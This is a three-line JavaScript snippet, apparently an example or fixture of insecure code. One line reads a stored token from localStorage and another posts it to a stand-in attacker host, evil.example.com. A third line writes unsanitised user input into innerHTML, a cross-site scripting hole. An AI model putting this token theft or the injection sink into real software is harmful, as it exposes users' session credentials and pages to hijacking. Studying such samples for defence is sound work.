const token = localStorage.getItem('dsh-token');
fetch('http://evil.example.com/token', { method: 'POST', body: token });
document.getElementById('app').innerHTML = userInput;
